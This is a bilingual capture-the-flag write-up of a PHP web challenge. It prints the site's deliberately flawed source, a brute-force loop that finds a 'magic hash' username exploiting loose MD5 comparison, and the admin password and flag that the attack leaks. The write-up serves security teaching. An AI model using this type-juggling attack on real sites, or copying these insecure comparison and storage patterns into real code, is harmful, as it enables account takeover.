## Impossible (web, 225p)

### PL
[ENG](#eng-version)

Według opisu zadania, flaga jest schowana na stronie http://impossible.asis-ctf.ir/
Możemy tam zakładać konta, ale muszą one zostać aktywowane żeby się zalogować.
Jak zwykle zaczynamy od ściągnięcia `robots.txt` aby sprawdzić co autorzy strony chcą przed nami ukryć.
http://impossible.asis-ctf.ir/robots.txt ma tylko jeden wpis:

    User-agent: *
    Disallow: /backup

Pod http://impossible.asis-ctf.ir/backup/ znajdziemy zrzut całej strony. Znacząco ułatwia nam to zadanie.

W `functions.php` znajduje się mini-implementacja bazy danych:

	function username_exist($username) {
		$data = file_get_contents('../users.dat');
		$users = explode("\n", $data);
		foreach ($users as $key => $value) {
			$user_data = explode(",", $value);
			if ($user_data[2] == '1' && base64_encode($username) == $user_data[0]) {
				return true;
			}
		}
		return false;
	}

	function add_user($username, $email, $password) {
		file_put_contents("../users.dat", base64_encode($username) . "," . base64_encode($email) . ",0\n", $flag = FILE_APPEND);
		file_put_contents("../passwords.dat", md5($username) . "," . base64_encode($password) . "\n", $flag = FILE_APPEND);
	}

	function get_user($username) {
		$data = file_get_contents('../passwords.dat');
		$passwords = explode("\n", $data);
		foreach ($passwords as $key => $value) {
			$user_data = explode(",", $value);
			if (md5($username) == $user_data[0]) {
				return array($username, base64_decode($user_data[1]));
			}
		}
		return array("", "");
	}

`register.php` umożliwia nam stworzenie nowego konta - o ile nie istnieje już jakieś o tej samej nazwie:
	
	$check = preg_match("/^[a-zA-Z0-9]+$/", $_POST['username']);
	if (!$check) {
	} elseif (username_exist($_POST['username'])) {
		$result = 1;
		$title = "Registration Failed";
	} else {
		add_user($_POST['username'], $_POST['email'], $_POST['password']);
		$user_info = get_user($_POST['username']);
		$result = 2;
		$title = "Registration Complete";
	}

`index.php` umożliwia zalogowanie się - o ile użytkownik jest aktywny i ma pasujące hasło:

	if(username_exist($_POST['username'])) {
		$user_info = get_user($_POST['username']);
		if ($user_info[1] == $_POST['password']) {
			$login = true;
		}
	}

Nasz atak wykorzystuje kilka luk:

1. W `passwords.dat` nazwy użytkownika są zahaszowane MD5 ale hasła są tylko zakodowane base64.
2. `register.php` wypisuje hasło nowo utworzonego użytkownika. Albo, dokładniej, hasło pierwszego użytkownika którego nazwa ma takie samo md5.
3. Skróty md5 są porównywane operatorem `==`. Jeżeli porównywane łańcuchy są poprawnymi liczbami, zostaną porównane jako liczby.
4. Dziwnym zbiegiem okoliczności aktywny użytkownik z takim numerycznym md5 już istnieje w bazie: `md5("adm2salwg") == "0e004561083131340065739640281486"`

`0e004561083131340065739640281486` po przekonwertowaniu na liczbę jest równe 0 (w notacji matematycznej 0*10<sup>4561083131340065739640281486</sup>). Potrzebna nam będzie inna nazwa, której md5 jest również równe 0 po skonwertowaniu na liczbę.
Nawet w PHP, przeszukując kolejne liczby dostaniemy wynik po zaledwie kilku minutach:

	$p = md5("adm2salwg");
	$i = 0;
	while(true) {
		if(md5("".$i) == $p) {
			echo $i;
		}
		$i++;
	}

Pierwsze rozwiązanie: `240610708` nie zadziałało. Użytkownik z taką nazwą już istniał w bazie. Drugie rozwiązanie: `314282422` zadziałało bez problemu.
Wystarczy stworzyć nowe konto o nazwie: `314282422` a skrypt odeśle nam hasło użytkownika `adm2salwg`:

    1W@ewes$%rq0

Po zalogowaniu jako `adm2salwg`, pojawia się flaga:

	ASIS{d9fb4932eb4c45aa793301174033dff9}

Skrypty posiadają jeszcze jedną, potencjalnie użyteczną, lukę. `file_put_contents` nie jest operacją atomową.
Przez rejestrację wielu użytkowników z długimi nazwami i emailami równolegle, powinno się dać utworzyć niepoprawne wpisy w obu plikach.
Nie udało nam się tego jednak wykorzystać.

### ENG version

The flag is supposed to be hidden here: http://impossible.asis-ctf.ir/
It looks like we can add new accounts, but they must be activated before logging in.
As usual, we start by examining `robots.txt` to find what we are not supposed to look at.
http://impossible.asis-ctf.ir/robots.txt contains just two lines:

    User-agent: *
    Disallow: /backup

http://impossible.asis-ctf.ir/backup/ contains dump of the whole site which is going to make the whole thing a lot easier.

`functions.php` contains an ad-hoc implementation of a database:

	function username_exist($username) {
		$data = file_get_contents('../users.dat');
		$users = explode("\n", $data);
		foreach ($users as $key => $value) {
			$user_data = explode(",", $value);
			if ($user_data[2] == '1' && base64_encode($username) == $user_data[0]) {
				return true;
			}
		}
		return false;
	}

	function add_user($username, $email, $password) {
		file_put_contents("../users.dat", base64_encode($username) . "," . base64_encode($email) . ",0\n", $flag = FILE_APPEND);
		file_put_contents("../passwords.dat", md5($username) . "," . base64_encode($password) . "\n", $flag = FILE_APPEND);
	}

	function get_user($username) {
		$data = file_get_contents('../passwords.dat');
		$passwords = explode("\n", $data);
		foreach ($passwords as $key => $value) {
			$user_data = explode(",", $value);
			if (md5($username) == $user_data[0]) {
				return array($username, base64_decode($user_data[1]));
			}
		}
		return array("", "");
	}

`register.php` allows you to add new account, unless one already exists and is active:
	
	$check = preg_match("/^[a-zA-Z0-9]+$/", $_POST['username']);
	if (!$check) {
	} elseif (username_exist($_POST['username'])) {
		$result = 1;
		$title = "Registration Failed";
	} else {
		add_user($_POST['username'], $_POST['email'], $_POST['password']);
		$user_info = get_user($_POST['username']);
		$result = 2;
		$title = "Registration Complete";
	}

`index.php` allows you to login, if user is active and has matching password:

	if(username_exist($_POST['username'])) {
		$user_info = get_user($_POST['username']);
		if ($user_info[1] == $_POST['password']) {
			$login = true;
		}
	}

Our exploit leverages several issues in those scripts.

1. `passwords.dat` contains md5 sums of user names but passwords are base64 encoded.
2. `register.php` will echo your password back to you. Or, actually, password of first user whose name has the same md5 as yours.
3. md5s are compared using == operator. If compared strings are valid numbers, they will be parsed first.
4. By strange coincidence active user with such numeric md5 already exists in the database: `md5("adm2salwg") == "0e004561083131340065739640281486"`

`0e004561083131340065739640281486` parses to number 0. We just need a different user name which md5 also parses to 0.
Brute forcing that, even in PHP, only takes a couple of minutes.

	$p = md5("adm2salwg");
	$i = 0;
	while(true) {
		if(md5("".$i) == $p) {
			echo $i;
		}
		$i++;
	}

First solution: `240610708` didn't work. There already was an account with that name. But the second one: `314282422` worked fine.
All you have to do is create account with user name: `314282422` and script will echo you `adm2salwg`'s password:

    1W@ewes$%rq0

After logging in as `adm2salwg`, flag is displayed:

	ASIS{d9fb4932eb4c45aa793301174033dff9}

There is one more potentially critical issue in those scripts. `file_put_contents` is not atomic.
By registering a lot of users with long names and emails, it should be possible to create bogus entries in both databases.
We weren't able to exploit it though.